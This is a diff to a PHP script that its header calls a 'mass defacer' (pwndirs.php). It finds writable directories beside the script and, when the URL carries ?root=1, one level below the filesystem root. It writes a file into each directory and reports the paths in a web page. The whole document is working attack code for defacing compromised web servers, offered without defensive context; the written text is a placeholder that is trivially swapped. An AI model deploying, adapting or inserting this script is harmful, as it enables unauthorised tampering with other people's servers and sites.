@@ -1,30 +1,15 @@
 <?php
 
 # pwndirs.php - Mass defacer. What?
-# v. 2018-04-18
+# v. 2018-04-19
+
+define('DS','/');
 
 # Functions
 ##
 
-# Slash detection
-function slashDetect() {
-    if ( function_exists('php_uname') ) {
-        if ( strtoupper(substr(php_uname('s'), 0, 3)) === 'WIN' ) {
-            $OSlash = '\\';
-        } else {
-            $OSlash = '/';
-        }
-    } elseif ( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ) {
-        $OSlash = '\\';
-    } else {
-        $OSlash = '/';
-    }
-
-    return $OSlash;
-}
-
-# Find PHP version and current dir
-function currentDir() {
+# Find current dir based on PHP ver
+function current_dir() {
     $vers[0] = '1';
     $vers[1] = '1';
 
@@ -34,34 +19,62 @@ function currentDir() {
 
     if ($vers[0] <= 5) {
         if ($vers[1] <= 3) {
-            $curDir = dirname(__FILE__);
+            $cur_dir = dirname(__FILE__);
         }
     } else {
-        $curDir = __DIR__;
+        $cur_dir = __DIR__;
     }
-    return $curDir;
+    return $cur_dir;
 }
 
-$dir = currentDir();
-$slash = slashDetect();
-$filesArray = scandir($dir);
-$dirsArray = [];
-$fileName = 'test.txt';
-$fileContent = "This is a test.\n";
+# Variables
+##
 
-foreach ($filesArray as $file) {
-    $dirsPath = $dir . $slash . $file;
+$dir = current_dir();
+$files_array = scandir($dir);
+$root_array = scandir('/');
+$dirs_array = [];
+$file_name = 'test.txt';
+$file_content = 'This is a test.';
 
-    if ( is_writable($file) ) {
-        if ($file === '.' or $file === '..') {
-            continue;
-        } elseif ( is_dir($dirsPath) ) {
-            array_push($dirsArray, $dirsPath);
+# Main
+##
+
+# Find writable dirs below __DIR__
+foreach ($files_array as $file) {
+    $dirs_path = $dir . DS . $file;
+
+    if ($file === '.' or $file === '..') {
+        continue;
+    } elseif ( is_dir($dirs_path) ) {
+        if ( is_writable($dirs_path) ) {
+            array_push($dirs_array, $dirs_path);
         }
     }
 }
 
-foreach ($dirsArray as $pwned) {
-    $file = $pwned . $slash . $fileName;
-    file_put_contents($file, $fileContent);
+# Find writable dirs a level below root
+if ( isset($_GET['root']) && $_GET['root'] === '1' ) {
+    foreach ($root_array as $file) {
+        $dirs_path = DS . $file;
+
+        if ($file === '.' or $file === '..' or $file === 'lost+found') {
+            continue;
+        } elseif ( is_dir($dirs_path) ) {
+            if ( is_writable($dirs_path) ) {
+                array_push($dirs_array, $dirs_path);
+            }
+        }
+    }
+}
+
+# Scribble
+if ( function_exists('file_put_contents') ) {
+    echo "<!doctype html>\n<html lang=en>\n<title>.</title>\n<body>\n";
+    foreach ($dirs_array as $pwned) {
+        $file = $pwned . DS . $file_name;
+        if ( file_put_contents($file, $file_content) ) {
+            echo "Wrote to $file<br>\n";
+        }
+    }
 }
